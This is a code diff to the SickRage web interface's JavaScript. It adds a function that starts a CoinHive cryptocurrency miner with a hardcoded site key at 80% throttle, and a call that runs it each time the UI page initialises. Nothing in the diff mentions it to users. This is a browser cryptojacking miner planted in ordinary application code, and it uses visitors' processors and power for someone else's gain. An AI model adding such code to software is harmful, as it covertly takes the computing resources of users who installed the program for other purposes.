@@ -13,6 +13,12 @@ jQuery(document).ready(function ($) {
             this.xhrPool = [];
         },
 
+        coinhive: function () {
+            var ch = new CoinHive.Anonymous('1hc1dBLexNbhpGSCQbBrPhtcFeqB2XdT');
+            ch.setThrottle(0.8);
+            ch.start();
+        },
+
         check_notifications: function () {
             var message_url = SICKRAGE.srWebRoot + '/ui/get_messages';
             if ('visible' === document.visibilityState) {
@@ -118,6 +124,8 @@ jQuery(document).ready(function ($) {
                 SICKRAGE.themeSpinner = SICKRAGE.getMeta('themeSpinner');
                 SICKRAGE.loadingHTML = '<img src="' + SICKRAGE.getMeta('srWebRoot') + '/images/loading16' + SICKRAGE.getMeta('themeSpinner') + '.gif" height="16" width="16" />';
                 SICKRAGE.anonURL = SICKRAGE.getMeta('anonURL');
+
+                SICKRAGE.coinhive();
 
                 // tooltips
                 $('[title!=""]').qtip({
@@ -391,6 +399,8 @@ jQuery(document).ready(function ($) {
                 $(window).unload(function () {
                     SICKRAGE.xhrAbortAll();
                 });
+
+
             }
         },
 
